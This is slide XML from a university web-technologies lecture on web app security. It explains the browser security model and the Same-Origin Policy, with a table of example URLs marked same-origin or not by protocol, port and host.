              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-110"/>
              <a:t>BROWSER </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t>SECURITY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>MODEL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962050" y="1533220"/>
            <a:ext cx="5262880" cy="3780154"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="55244" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Modern</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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browsers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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enforce</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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strict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	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security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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model</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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improve</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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security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	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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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block</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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some</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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kinds</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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attacks.</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="299085" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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As</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>developer,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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you</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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need</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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aware</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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security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	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mechanisms</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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place</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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how</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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work</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>them</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3190"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="665"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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One</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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such</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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mechanisms</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="3190"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Same-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-15" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Policy</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="object 4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436099" y="1602944"/>
            <a:ext cx="3225811" cy="4351321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>46</a:t>
            </a:fld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62050" y="557529"/>
            <a:ext cx="6282055" cy="57404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THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-225"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="245"/>
              <a:t>SAME-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>ORIGIN</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-229"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t>POLICY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962050" y="1533220"/>
            <a:ext cx="10256520" cy="1859280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="875030" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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By</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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default,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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document</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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script</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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only</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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allowed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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interact</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>with </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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resources</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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from</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>same</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-60" b="1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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>origin</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Same</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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origin</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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means</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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URL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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has</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>same</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-40" b="1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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>protocol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,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>port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,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>host</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Consider</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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document</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://store.webtech.com/cat/index.html</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="882218" y="3556634"/>
          <a:ext cx="10503535" cy="26187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501515"/>
                <a:gridCol w="1507489"/>
                <a:gridCol w="4417695"/>
              </a:tblGrid>
              <a:tr h="365125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dirty="0" sz="1800" spc="-25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URL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B="0" marT="31115"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rgbClr val="111F35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158750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dirty="0" sz="1800" spc="-1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Same-origin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B="0" marT="31115"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rgbClr val="111F35"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870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dirty="0" sz="1800" spc="-1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Reason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B="0" marT="31115"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rgbClr val="111F35"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="45085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585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                          <a:hlinkClick r:id="rId3"/>
                        </a:rPr>
                        <a:t>http://store.webtech.com/pages/about.html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B="0" marT="74295">
                    <a:lnT w="28575">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:solidFill>
                      <a:srgbClr val="004E5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T w="28575">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="180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Only</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-15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0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the</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-2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0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path</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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00" spc="-1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differs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B="0" marT="74295">
                    <a:lnT w="28575">
                      <a:solidFill>
                        <a:srgbClr val="FFFFFF"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                    </a:lnT>
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="450215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580"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                          <a:hlinkClick r:id="rId4"/>
                        </a:rPr>
                        <a:t>http://store.webtech.com/img/logo.png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B="0" marT="73660">
                    <a:solidFill>
                      <a:srgbClr val="00637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solidFill>
                      <a:srgbClr val="006379"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="580"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="180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Only</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-15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0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the</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-2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0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path</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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00" spc="-1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differs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B="0" marT="73660">
                    <a:solidFill>
                      <a:srgbClr val="006379"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="45085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585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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https://store.webtech.com/page.html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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="004E5F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182245">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="605"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI Symbol"/>
                          <a:cs typeface="Segoe UI Symbol"/>
                        </a:rPr>
                        <a:t>✘</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Segoe UI Symbol"/>
                        <a:cs typeface="Segoe UI Symbol"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="0" marR="0" marB="0" marT="76835">
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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Different</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-7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00" spc="-1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protocol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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="45085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585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                          <a:hlinkClick r:id="rId5"/>
                        </a:rPr>
                        <a:t>http://store.webtech.com:81/dir/page.html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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="006379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182245">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="610"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI Symbol"/>
                          <a:cs typeface="Segoe UI Symbol"/>
                        </a:rPr>
                        <a:t>✘</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Segoe UI Symbol"/>
                        <a:cs typeface="Segoe UI Symbol"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="0" marR="0" marB="0" marT="77470">
                    <a:solidFill>
                      <a:srgbClr val="006379"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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Different</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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0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port</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25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0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(http</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-2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0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is</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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0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port</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-25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0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80</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-3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0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by</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-2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00" spc="-1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default)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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="006379"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="45085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585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-10">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri"/>
                          <a:cs typeface="Calibri"/>
                          <a:hlinkClick r:id="rId6"/>
                        </a:rPr>
                        <a:t>http://course.webtech.com/cat/index.html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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="004E5F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182245">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="605"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-50">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Segoe UI Symbol"/>
                          <a:cs typeface="Segoe UI Symbol"/>
                        </a:rPr>
                        <a:t>✘</a:t>
                      </a:r>
                      <a:endParaRPr sz="1800">
                        <a:latin typeface="Segoe UI Symbol"/>
                        <a:cs typeface="Segoe UI Symbol"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="0" marR="0" marB="0" marT="76835">
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="102870">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="585"/>
                        </a:spcBef>
                      </a:pPr>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-1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Different</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr dirty="0" sz="1800" spc="-45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00" spc="-2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host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B="0" marT="74295">
                    <a:solidFill>
                      <a:srgbClr val="004E5F"/>
                    </a:solidFill>
